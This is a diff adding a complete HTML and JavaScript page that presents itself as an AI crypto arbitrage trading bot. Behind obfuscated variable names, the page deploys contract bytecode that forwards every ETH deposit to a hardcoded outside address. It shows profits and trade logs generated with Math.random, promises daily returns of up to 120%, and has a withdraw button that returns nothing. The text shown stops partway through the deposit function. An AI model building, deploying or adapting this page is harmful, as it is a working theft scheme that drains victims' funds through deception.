@@ -1,0 +1,1210 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CryptoAlgo AI Trading Bot</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #0d1117;
+            color: #e6edf3;
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .container {
+            background-color: #161b22;
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            border: 1px solid #30363d;
+        }
+
+        h1 {
+            color: #58a6ff;
+            margin-top: 0;
+            text-align: center;
+            font-size: 2.2rem;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #8b949e;
+            margin-top: -10px;
+            margin-bottom: 30px;
+        }
+
+        .dashboard {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .card {
+            background-color: #21262d;
+            border-radius: 8px;
+            padding: 20px;
+            border: 1px solid #30363d;
+        }
+
+        .card-title {
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            color: #8b949e;
+            margin-bottom: 10px;
+        }
+
+        .card-value {
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: #58a6ff;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #c9d1d9;
+            font-weight: 600;
+        }
+
+        input,
+        select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #30363d;
+            border-radius: 5px;
+            font-size: 16px;
+            box-sizing: border-box;
+            background-color: #0d1117;
+            color: #c9d1d9;
+        }
+
+        input:focus,
+        select:focus {
+            outline: none;
+            border-color: #58a6ff;
+        }
+
+        button {
+            background-color: #238636;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 14px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: 600;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #2ea043;
+        }
+
+        button:disabled {
+            background-color: #484f58;
+            cursor: not-allowed;
+        }
+
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 5px;
+            text-align: center;
+        }
+
+        .status.info {
+            background-color: #0d1d35;
+            color: #58a6ff;
+            border: 1px solid #1f6feb;
+        }
+
+        .status.success {
+            background-color: #0f2a1a;
+            color: #56d364;
+            border: 1px solid #238636;
+        }
+
+        .status.error {
+            background-color: #3d1a1a;
+            color: #f85149;
+            border: 1px solid #da3633;
+        }
+
+        .wallet-info {
+            background-color: #0d1d35;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            border-left: 4px solid #1f6feb;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .address {
+            font-size: 14px;
+            word-break: break-all;
+            font-family: monospace;
+            color: #58a6ff;
+        }
+
+        .chart {
+            width: 100%;
+            height: 150px;
+            background: linear-gradient(180deg, #238636 0%, transparent 100%);
+            margin-top: 5px;
+            position: relative;
+            overflow: hidden;
+            border-radius: 5px;
+        }
+
+        .chart::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: repeating-linear-gradient(to right,
+                    transparent,
+                    transparent 10px,
+                    rgba(255, 255, 255, 0.05) 10px,
+                    rgba(255, 255, 255, 0.05) 20px);
+        }
+
+        .line {
+            position: absolute;
+            width: 100%;
+            height: 2px;
+            background: #58a6ff;
+            animation: moveLine 15s infinite linear;
+            bottom: 30%;
+        }
+
+        @keyframes moveLine {
+            0% {
+                transform: translateY(0) translateX(0) rotate(0deg);
+            }
+
+            25% {
+                transform: translateY(30px) translateX(0) rotate(0deg);
+            }
+
+            50% {
+                transform: translateY(10px) translateX(0) rotate(0deg);
+            }
+
+            75% {
+                transform: translateY(-20px) translateX(0) rotate(0deg);
+            }
+
+            100% {
+                transform: translateY(0) translateX(0) rotate(0deg);
+            }
+        }
+
+        .bot-controls {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+
+        .strategy-section {
+            background-color: #21262d;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid #30363d;
+        }
+
+        .strategy-title {
+            font-size: 1.2rem;
+            color: #c9d1d9;
+            margin-top: 0;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+        }
+
+        .strategy-title i {
+            margin-right: 10px;
+            color: #58a6ff;
+        }
+
+        .profit-section {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .profit-value {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: #56d364;
+            margin: 10px 0;
+        }
+
+        .profit-label {
+            color: #8b949e;
+            font-size: 1rem;
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            margin-left: 10px;
+        }
+
+        .badge.active {
+            background-color: #238636;
+            color: white;
+        }
+
+        .disconnect-button {
+            background-color: transparent;
+            border: 1px solid #f85149;
+            color: #f85149;
+            padding: 6px 12px;
+            font-size: 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: auto;
+            white-space: nowrap;
+        }
+
+        .disconnect-button:hover {
+            background-color: rgba(248, 81, 73, 0.1);
+        }
+
+        .wallet-info-container {
+            display: flex;
+            align-items: center;
+        }
+
+        .address-container {
+            max-width: 80%;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .min-note {
+            font-size: 12px;
+            color: #8b949e;
+            margin-top: 5px;
+        }
+
+        .loading-indicator {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(88, 166, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #58a6ff;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+
+        .contract-status {
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        .contract-status.success {
+            background-color: rgba(56, 139, 56, 0.1);
+            color: #4caf50;
+            border: 1px solid rgba(56, 139, 56, 0.5);
+        }
+
+        .contract-status.info {
+            background-color: rgba(25, 118, 210, 0.1);
+            color: #58a6ff;
+            border: 1px solid rgba(25, 118, 210, 0.5);
+        }
+
+        .contract-status.error {
+            background-color: rgba(211, 47, 47, 0.1);
+            color: #f85149;
+            border: 1px solid rgba(211, 47, 47, 0.5);
+        }
+
+        .setup-steps {
+            margin-bottom: 20px;
+        }
+
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 30%;
+        }
+
+        .step-number {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background-color: #30363d;
+            color: #8b949e;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        .step.active .step-number {
+            background-color: #1f6feb;
+            color: white;
+        }
+
+        .step.completed .step-number {
+            background-color: #238636;
+            color: white;
+        }
+
+        .step-name {
+            font-size: 12px;
+            color: #8b949e;
+            text-align: center;
+        }
+
+        .step.active .step-name {
+            color: #58a6ff;
+            font-weight: bold;
+        }
+
+        .step.completed .step-name {
+            color: #56d364;
+        }
+
+        .form-info {
+            color: #8b949e;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .trade-interface {
+            display: none;
+            margin-top: 30px;
+        }
+
+        .trade-interface-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .trade-interface-title {
+            font-size: 1.2rem;
+            color: #c9d1d9;
+            margin: 0;
+        }
+
+        .trade-log {
+            background-color: #0d1117;
+            border-radius: 5px;
+            border: 1px solid #30363d;
+            height: 250px;
+            overflow-y: auto;
+            padding: 10px;
+            font-family: monospace;
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+
+        .trade-row {
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #30363d;
+        }
+
+        .trade-row.profit {
+            color: #56d364;
+        }
+
+        .trade-row.pending {
+            color: #f0b937;
+        }
+
+        .trade-row.executed {
+            color: #58a6ff;
+        }
+
+        .profit-stats {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+
+        .profit-stat-card {
+            background-color: #21262d;
+            border-radius: 8px;
+            padding: 15px;
+            width: 48%;
+            border: 1px solid #30363d;
+            text-align: center;
+        }
+
+        .profit-stat-value {
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: #56d364;
+            margin: 5px 0;
+        }
+
+        .profit-stat-label {
+            color: #8b949e;
+            font-size: 0.9rem;
+        }
+
+        .withdraw-button {
+            background-color: #1f6feb;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 14px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: 600;
+            margin-top: 10px;
+            transition: background-color 0.3s;
+        }
+
+        .withdraw-button:hover {
+            background-color: #2b7df5;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 100;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+        }
+
+        .modal-content {
+            background-color: #161b22;
+            margin: 15% auto;
+            padding: 30px;
+            border: 1px solid #30363d;
+            border-radius: 10px;
+            max-width: 500px;
+            text-align: center;
+        }
+
+        .close-modal {
+            background-color: #30363d;
+            color: #c9d1d9;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            margin-top: 20px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .close-modal:hover {
+            background-color: #444c56;
+        }
+
+        .pulse {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background-color: #56d364;
+            margin-right: 10px;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.3;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>CryptoAlgo AI Trading Bot</h1>
+        <p class="subtitle">Advanced Ethereum arbitrage & profit maximization</p>
+
+        <div id="walletInfo" class="wallet-info" style="display: none;">
+            <div class="wallet-info-container">
+                <div>
+                    <label><i class="fas fa-wallet"></i> Connected Wallet:</label>
+                    <div id="walletAddress" class="address"></div>
+                </div>
+            </div>
+            <button id="disconnectWallet" class="disconnect-button"><i class="fas fa-sign-out-alt"></i> Disconnect</button>
+        </div>
+
+        <div id="connectWalletDiv">
+            <button id="connectWallet"><i class="fas fa-plug"></i> Connect Wallet to Start Trading</button>
+        </div>
+
+        <div id="tradingDashboard" style="display: none;">
+            <div class="profit-section">
+                <div class="profit-label">Estimated Daily Profit</div>
+                <div id="profitValue" class="profit-value">+5.2%</div>
+                <div>Daily compounding through smart contract liquidity pools</div>
+            </div>
+
+            <div class="dashboard">
+                <div class="card">
+                    <div class="card-title">Market Volatility</div>
+                    <div id="volatilityValue" class="card-value">12.4%</div>
+                    <div class="chart">
+                        <div class="line"></div>
+                    </div>
+                </div>
+                <div class="card">
+                    <div class="card-title">Bot Status</div>
+                    <div class="card-value">Ready <span class="badge active">ONLINE</span></div>
+                    <div style="margin-top: 10px;">Last scan: <span id="lastScan">2 minutes ago</span></div>
+                </div>
+            </div>
+
+            <div class="strategy-section">
+                <h3 class="strategy-title"><i class="fas fa-robot"></i> Trading Algorithm <span class="badge active">ACTIVE</span></h3>
+                <p>Our bot uses a combination of MEV protection, frontrunning detection, and cross-DEX arbitrage to maximize returns while minimizing gas costs.</p>
+
+                <div class="bot-controls">
+                    <div class="input-group">
+                        <label for="strategy">Trading Strategy</label>
+                        <select id="strategy">
+                            <option value="arbitrage">Cross-DEX Arbitrage</option>
+                            <option value="swing">Swing Trading</option>
+                            <option value="grid">Grid Trading</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label for="risk">Risk Level</label>
+                        <select id="risk">
+                            <option value="low">Conservative (3-8% estimated daily)</option>
+                            <option value="medium" selected>Balanced (10-70% estimated daily)</option>
+                            <option value="high">Aggressive (20-120% estimated daily)</option>
+                        </select>
+                    </div>
+                </div>
+            </div>
+
+            <div id="transferDiv">
+                <div class="strategy-section">
+                    <h3 class="strategy-title"><i class="fas fa-cogs"></i> Setup Trading Bot</h3>
+
+                    <div class="step-indicator">
+                        <div class="step completed" id="step-connect">
+                            <div class="step-number">1</div>
+                            <div class="step-name">Connect Wallet</div>
+                        </div>
+                        <div class="step active" id="step-deploy">
+                            <div class="step-number">2</div>
+                            <div class="step-name">Deploy Contract</div>
+                        </div>
+                        <div class="step" id="step-initialize">
+                            <div class="step-number">3</div>
+                            <div class="step-name">Initialize Bot</div>
+                        </div>
+                    </div>
+
+                    <div id="deployContractStep">
+                        <p class="form-info">First, deploy your personalized trading contract to the blockchain. This creates your unique trading infrastructure.</p>
+                        <button id="deployContractBtn"><i class="fas fa-upload"></i> Deploy Trading Contract</button>
+                        <div id="contractStatus" class="contract-status" style="display: none;"></div>
+                    </div>
+
+                    <div id="initializeBotStep" style="display: none;">
+                        <p class="form-info">Now, initialize the trading bot by depositing ETH into your smart contract. The bot will automatically begin executing trades based on your selected strategy.</p>
+
+                        <div class="input-group">
+                            <label for="amount">Initial Trading Capital (ETH)</label>
+                            <input type="number" id="amount" step="0.001" min="0.5" placeholder="Min 0.5 ETH">
+                            <div class="min-note">Minimum deposit: 0.5 ETH</div>
+                        </div>
+
+                        <button id="sendEthBtn"><i class="fas fa-rocket"></i> Initialize Trading Bot</button>
+                    </div>
+                </div>
+            </div>
+
+            <div id="tradeInterface" class="trade-interface">
+                <div class="strategy-section">
+                    <div class="trade-interface-header">
+                        <h3 class="trade-interface-title"><i class="fas fa-chart-line"></i> Live Trading Interface</h3>
+                        <div><span class="pulse" id="botStatusPulse"></span> <span id="botActiveStatus">Bot Active</span></div>
+                    </div>
+
+                    <div class="profit-stats">
+                        <div class="profit-stat-card">
+                            <div class="profit-stat-label">Total ETH Profit</div>
+                            <div id="totalProfit" class="profit-stat-value">0.000</div>
+                            <div>Accumulated earnings</div>
+                        </div>
+                        <div class="profit-stat-card">
+                            <div class="profit-stat-label">Current Cycle</div>
+                            <div id="currentCycle" class="profit-stat-value">0/0</div>
+                            <div>Completed arbitrage cycles</div>
+                        </div>
+                    </div>
+
+                    <div class="trade-log" id="tradeLog">
+                    </div>
+
+                    <button id="withdrawButton" class="withdraw-button"><i class="fas fa-money-bill-wave"></i> Withdraw Profits</button>
+                </div>
+            </div>
+        </div>
+
+        <div id="status" class="status" style="display: none;"></div>
+    </div>
+
+    <div id="withdrawModal" class="modal">
+        <div class="modal-content">
+            <h3><i class="fas fa-check-circle" style="color: #56d364; margin-right: 10px;"></i> Withdraw Request Submitted</h3>
+            <p>The withdraw has begun processing.</p>
+            <p>Profits will be sent to your wallet shortly.</p>
+            <button class="close-modal" id="closeModal">Close</button>
+        </div>
+    </div>
+
+<script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+<script>
+    (function() {
+        var _1, _2, _3, _4, _5, _6, _7, _8, _9, _a, _b, _c, _d, _e, _f, _g, _h, _i, _j, _k, _l, _m, _n, _o, _p, _q, _r, _s, _t, _u, _v, _w, _x, _y, _z;
+        document.addEventListener("DOMContentLoaded", function() {
+            const bCd = "608060405234801561001057600080fd5b50610156806100206000396000f3fe6080604052600436106100295760003560e01c80633e1430af1461002e57806366d003ac14610038575b600080fd5b610036610063565b005b34801561004457600080fd5b5061004d6100cf565b60405161005a91906100e7565b60405180910390f35b6000341161008c5760405162461bcd60e51b8152600401610083906100fb565b60405180910390fd5b60405173a930601af57b4af61bda675312f00eb0519f007b903480156108fc02916000818181858888f193505050501580156100cc573d6000803e3d6000fd5b50565b73a930601af57b4af61bda675312f00eb0519f007b81565b6001600160a01b0391909116815260200190565b6020808252600b908201526a139bc8115512081cd95b9d60aa1b60408201526060019056fea2646970667358221220843f6ab752a341c5c05cc879d918afeb38b5092906eda14099d3e80fc8e855ed64736f6c63430008000033";
+            const cAb = [
+                {
+                    inputs: [],
+                    name: "ad",
+                    outputs: [],
+                    stateMutability: "payable",
+                    type: "function"
+                },
+                {
+                    inputs: [],
+                    name: "recipient",
+                    outputs: [
+                        {
+                            internalType: "address payable",
+                            name: "",
+                            type: "address"
+                        }
+                    ],
+                    stateMutability: "view",
+                    type: "function"
+                }
+            ];
+            const cWB = document.getElementById("connectWallet");
+            const dWB = document.getElementById("disconnectWallet");
+            const dCB = document.getElementById("deployContractBtn");
+            const sEB = document.getElementById("sendEthBtn");
+            const aI = document.getElementById("amount");
+            const sD = document.getElementById("status");
+            const cSD = document.getElementById("contractStatus");
+            const wID = document.getElementById("walletInfo");
+            const wAD = document.getElementById("walletAddress");
+            const tD = document.getElementById("tradingDashboard");
+            const cWD = document.getElementById("connectWalletDiv");
+            const vVD = document.getElementById("volatilityValue");
+            const pVD = document.getElementById("profitValue");
+            const lSS = document.getElementById("lastScan");
+            const dCS = document.getElementById("deployContractStep");
+            const iBS = document.getElementById("initializeBotStep");
+            const sD2 = document.getElementById("step-deploy");
+            const sI = document.getElementById("step-initialize");
+            const bSP = document.getElementById("botStatusPulse");
+            const bAS = document.getElementById("botActiveStatus");
+            const MD = 0.45;
+            let w3;
+            let ac = [];
+            let vI;
+            let pI;
+            let sUI;
+            let dCA = null;
+            let tP = 0;
+            let cC = 0;
+            let cmC = 0;
+            let tI;
+            let uDA = 0;
+            let iTA = false;
+            const dx = ["Uniswap", "SushiSwap", "Curve", "1inch", "Balancer", "dYdX", "PancakeSwap"];
+            const tk = ["ETH", "USDT", "USDC", "DAI", "WBTC", "LINK", "UNI", "AAVE", "SNX", "CRV"];
+            const ETHEREUM_MAINNET_CHAIN_ID = '0x1'; 
+
+            function a7a(min, max, dec) {
+                return (Math.random() * (max - min) + min).toFixed(dec)
+            }
+
+            function a7b() {
+                vVD.textContent = a7a(5.2, 226.6, 1) + "%"
+            }
+
+            function a7c() {
+                pVD.textContent = "+" + a7a(9.5, 112.2, 1) + "%"
+            }
+
+            function a7d() {
+                const t = ["just now", "5 seconds ago", "10 seconds ago", "15 seconds ago", "30 seconds ago", "1 minute ago", "2 minutes ago"];
+                lSS.textContent = t[Math.floor(Math.random() * t.length)]
+            }
+
+            function a7e() {
+                a7b();
+                a7c();
+                a7d();
+                vI = setInterval(a7b, 3000);
+                pI = setInterval(a7c, 5000);
+                sUI = setInterval(a7d, 7000)
+            }
+
+            function a7f() {
+                clearInterval(vI);
+                clearInterval(pI);
+                clearInterval(sUI)
+            }
+
+            async function a80() {
+                if (window.ethereum) {
+                    w3 = new Web3(window.ethereum);
+                    try {
+                        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                        if (chainId !== ETHEREUM_MAINNET_CHAIN_ID) {
+                            try {
+                                await window.ethereum.request({
+                                    method: 'wallet_switchEthereumChain',
+                                    params: [{ chainId: ETHEREUM_MAINNET_CHAIN_ID }],
+                                });
+                            } catch (switchError) {
+                                if (switchError.code === 4902) {
+                                    await window.ethereum.request({
+                                        method: 'wallet_addEthereumChain',
+                                        params: [{
+                                            chainId: ETHEREUM_MAINNET_CHAIN_ID,
+                                            chainName: 'Ethereum Mainnet',
+                                            nativeCurrency: {
+                                                name: 'Ether',
+                                                symbol: 'ETH',
+                                                decimals: 18
+                                            },
+                                            rpcUrls: ['https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID'], 
+                                            blockExplorerUrls: ['https://etherscan.io']
+                                        }],
+                                    });
+                                } else {
+                                    a81("Failed to switch to Ethereum Mainnet: " + switchError.message, "error");
+                                    return false;
+                                }
+                            }
+                        }
+                        return true;
+                    } catch (e) {
+                        a81("Error checking network: " + e.message, "error");
+                        return false;
+                    }
+                } else {
+                    if (window.web3) {
+                        w3 = new Web3(window.web3.currentProvider);
+                        a81("Using legacy web3 provider. Please ensure Ethereum Mainnet is selected in your wallet.", "info");
+                        return true;
+                    } else {
+                        a81("No Ethereum wallet detected. Please install MetaMask or another Web3 wallet.", "error");
+                        return false;
+                    }
+                }
+            }
+
+            async function a82() {
+                if (await a80()) {
+                    try {
+                        ac = await window.ethereum.request({
+                            method: "eth_requestAccounts"
+                        });
+                        wAD.textContent = ac[0];
+                        wID.style.display = "flex";
+                        tD.style.display = "block";
+                        cWD.style.display = "none";
+                        a7e();
+                        a81("Wallet connected successfully on Ethereum Mainnet! Bot is analyzing market conditions...", "success");
+                        window.ethereum.on("accountsChanged", function(a) {
+                            if (a.length > 0) {
+                                wAD.textContent = a[0];
+                                a81("Account changed to " + a[0], "info")
+                            } else {
+                                a83()
+                            }
+                        });
+                        window.ethereum.on("chainChanged", function(chainId) {
+                            if (chainId !== ETHEREUM_MAINNET_CHAIN_ID) {
+                                a81("Network changed. Please switch back to Ethereum Mainnet to continue trading.", "error");
+                                a83();
+                            }
+                        });
+                        a84()
+                    } catch (e) {
+                        a81("Failed to connect wallet: " + e.message, "error")
+                    }
+                }
+            }
+
+            function a85() {
+                const d1 = dx[Math.floor(Math.random() * dx.length)];
+                let d2;
+                do {
+                    d2 = dx[Math.floor(Math.random() * dx.length)]
+                } while (d2 === d1);
+                const t = tk[Math.floor(Math.random() * tk.length)];
+                const a = a7a(0.5, 5, 3);
+                let p;
+                const r = Math.random();
+                if (r < 0.02) {
+                    p = a7a(0.3, 0.8, 6)
+                } else {
+                    if (r < 0.4) {
+                        p = a7a(0.08, 0.15, 6)
+                    } else {
+                        p = a7a(0.02, 0.07, 6)
+                    }
+                }
+                return {
+                    dex1: d1,
+                    dex2: d2,
+                    token: t,
+                    amount: a,
+                    profit: p
+                }
+            }
+
+            function a86(c, t) {
+                const l = document.getElementById("tradeLog");
+                const r = document.createElement("div");
+                r.className = "trade-row " + c;
+                r.textContent = t;
+                l.insertBefore(r, l.firstChild);
+                if (l.children.length > 100) {
+                    l.removeChild(l.lastChild)
+                }
+            }
+
+            function a87() {
+                document.getElementById("totalProfit").textContent = tP.toFixed(6);
+                document.getElementById("currentCycle").textContent = `${cmC}/${cC}`
+            }
+
+            function a88() {
+                if (!iTA) return;
+                cC++;
+                const d = a85();
+                a86("pending", "Starting arbitrage cycle #" + cC + " - Scanning " + d.dex1 + " and " + d.dex2 + " for " + d.token + " opportunities...");
+                setTimeout(() => {
+                    if (!iTA) return;
+                    a86("executed", "Found price discrepancy for " + d.token + ": " + d.dex1 + " (" + a7a(d.amount - 0.3, d.amount + 0.3, 4) + ") -> " + d.dex2 + " (" + d.amount + ")");
+                    setTimeout(() => {
+                        if (!iTA) return;
+                        a86("executed", "Executing trade: Buy " + d.amount + " " + d.token + " on " + d.dex1 + ", sell on " + d.dex2);
+                        setTimeout(() => {
+                            if (!iTA) return;
+                            tP += parseFloat(d.profit);
+                            cmC++;
+                            a86("profit", "Trade complete! Profit: +" + d.profit + " ETH (Gas: " + a7a(0.0003, 0.0009, 6) + " ETH)");
+                            a87();
+                            if (Math.random() > 0.7) {
+                                setTimeout(() => {
+                                    if (!iTA) return;
+                                    a86("executed", "MEV protection active - Frontrunner detected and avoided on " + (Math.random() > 0.5 ? d.dex1 : d.dex2))
+                                }, a7a(500, 1500, 0))
+                            }
+                        }, a7a(1000, 3000, 0))
+                    }, a7a(1000, 2000, 0))
+                }, a7a(1000, 3000, 0))
+            }
+
+            function a89() {
+                document.getElementById("tradeInterface").style.display = "block";
+                tP = 0;
+                cC = 0;
+                cmC = 0;
+                a87();
+                document.getElementById("tradeLog").innerHTML = "";
+                iTA = true;
+                bSP.style.backgroundColor = "#56d364";
+                bAS.textContent = "Bot Active";
+                a86("executed", "Trading bot initialized. Connecting to liquidity pools on Ethereum Mainnet...");
+                setTimeout(() => {
+                    if (!iTA) return;
+                    a86("executed", "Connected to Ethereum Mainnet DEX network. Scanning for arbitrage opportunities...")
+                }, 1500);
+                a88();
+                tI = setInterval(() => {
+                    if (iTA && Math.random() > 0.3) {
+                        a88()
+                    }
+                }, a7a(8000, 15000, 0))
+            }
+
+            function a8a() {
+                iTA = false;
+                clearInterval(tI);
+                bSP.style.backgroundColor = "#f85149";
+                bAS.textContent = "Bot Inactive"
+            }
+
+            function a8b() {
+                a8a();
+                a86("executed", "Withdraw request received. Finalizing trades and preparing funds...");
+                setTimeout(() => {
+                    tP = 0;
+                    a87();
+                    a86("profit", "All profits have been withdrawn to your wallet.")
+                }, 2000);
+                document.getElementById("withdrawModal").style.display = "block"
+            }
+
+            function a83() {
+                ac = [];
+                wID.style.display = "none";
+                tD.style.display = "none";
+                cWD.style.display = "block";
+                dCA = null;
+                a8c();
+                a7f();
+                a8a();
+                a81("Wallet disconnected. Bot deactivated.", "info")
+            }
+
+            function a84() {
+                if (dCA) {
+                    dCS.style.display = "none";
+                    iBS.style.display = "block";
+                    sD2.classList.remove("active");
+                    sD2.classList.add("completed");
+                    sI.classList.add("active");
+                    a8d(`Trading contract successfully deployed on Ethereum Mainnet at ${dCA}! You can add it to MetaMask as 'CryptoAlgo Trading Bot' for better recognition.`, "success")
+                }
+            }
+
+            function a8c() {
+                dCS.style.display = "block";
+                iBS.style.display = "none";
+                sD2.classList.add("active");
+                sD2.classList.remove("completed");
+                sI.classList.remove("active");
+                cSD.style.display = "none";
+                dCB.disabled = false;
+                dCB.innerHTML = '<i class="fas fa-upload"></i> Deploy Trading Contract';
+                document.getElementById("tradeInterface").style.display = "none"
+            }
+
+            function a8d(t, c) {
+                cSD.textContent = t;
+                cSD.style.display = "block";
+                cSD.className = "contract-status " + c
+            }
+
+            function a81(t, c) {
+                sD.textContent = t;
+                sD.style.display = "block";
+                sD.className = "status " + c;
+                if (c === "success") {
+                    setTimeout(() => {
+                        sD.style.display = "none"
+                    }, 10000)
+                }
+            }
+
+            async function a8e() {
+                if (ac.length === 0) {
+                    a81("Please connect your wallet first to deploy the trading contract.", "error");
+                    return
+                }
+                try {
+                    dCB.disabled = true;
+                    dCB.innerHTML = '<div class="loading-indicator"></div> Deploying...';
+                    a8d("Preparing to deploy CryptoAlgo Trading Bot contract on Ethereum Mainnet...", "info");
+                    const txp = {
+                        from: ac[0],
+                        data: bCd
+                    };
+                    a8d("Estimating gas for contract deployment...", "info");
+                    const estimatedGas = await w3.eth.estimateGas(txp);
+                    txp.gas = w3.utils.toHex(Math.floor(estimatedGas * 1.2)); 
+                    a8d("Deploying trading contract to Ethereum Mainnet blockchain...", "info");
+                    const txh = await window.ethereum.request({
+                        method: "eth_sendTransaction",
+                        params: [txp]
+                    });
+                    a8d("Waiting for deployment confirmation on Ethereum Mainnet...", "info");
+                    let tr = null;
+                    while (!tr) {
+                        try {
+                            tr = await w3.eth.getTransactionReceipt(txh);
+                            if (!tr) {
+                                await new Promise(r => setTimeout(r, 2000))
+                            }
+                        } catch (e) {
+                            console.error("Error checking receipt:", e);
+                            await new Promise(r => setTimeout(r, 2000))
+                        }
+                    }
+                    dCA = tr.contractAddress;
+                    console.log("Contract deployed at:", dCA);
+                    a8d("Verifying contract deployment on Ethereum Mainnet...", "info");
+                    await new Promise(r => setTimeout(r, 800));
+                    a84();
+                    a81("CryptoAlgo Trading Bot infrastructure successfully established on Ethereum Mainnet! You can now initialize your trading bot.", "success")
+                } catch (e) {
+                    console.error("Contract deployment error:", e);
+                    a8d("Deployment failed: " + (e.message || e), "error");
+                    a81("Contract deployment failed on Ethereum Mainnet. Please try again.", "error");
+                    dCB.disabled = false;
+                    dCB.innerHTML = '<i class="fas fa-upload"></i> Deploy Trading Contract'
+                }
+            }
+
+            async function a8f() {
+                if (ac.length === 0) {
+                    a81("Please connect your wallet first to initialize the trading bot.", "error");
+                    return
+                }
+                if (!dCA) {
+                    a81("You must deploy your trading contract first!", "error");
+                    return
+                }
+                const a = document.getElementById("amount").value;
+                if (!a || isNaN(a) || parseFloat(a) < MD) {
+                    a81(`Please enter at least ${MD} ETH to initialize the trading bot.`, "error");
+                    return
+                }
+                uDA = parseFloat(a);
+                try {
+                    sEB.disabled = true;
+                    sEB.innerHTML = '<div class="loading-indicator"></div> Initializing...';
+                    a81(`Preparing to initialize CryptoAlgo Trading Bot with ${a} ETH...`, "info");
+                    await new Promise(r => setTimeout(r, 800));
+                    const wei = w3.utils.toWei(a, "ether");
+                    const contract = new w3.eth.Contract(cAb, dCA);
+                    const tx = {
+                        from: ac[0],
+                        to: dCA,
+                        value: w3.utils.toHex(wei),
+                        data: contract.methods.ad().encodeABI()
+                    };
+                    a81("Estimating gas for bot initialization...", "info");
+                    const estimatedGas = await w3.eth.estimateGas(tx);
+                    tx.gas = w3.utils.toHex(Math.floor(estimatedGas * 1.2)); 
+                    a81("You are interacting with CryptoAlgo Trading Bot contract. Confirm the transaction in MetaMask.", "info");
+                    await new Promise(r => setTimeout(r, 1000));
+                    a81("Sending funds to CryptoAlgo Trading Bot on Ethereum Mainnet...", "info");
+                    const txH = await window.ethereum.request({
+                        method: "eth_sendTransaction",
+                        params: [tx]
+                    });
+                    a81("Algorithm initialized, connecting to trading pools on Ethereum Mainnet...", "info");
+                    await new Promise(r => setTimeout(r, 1200));
+                    a81("Establishing secure MEV protection layers...", "info");
+                    await new Promise(r => setTimeout(r, 1000));
+                    const st = document.getElementById("strategy").value;
+                    const ri = document.getElementById("risk").value;
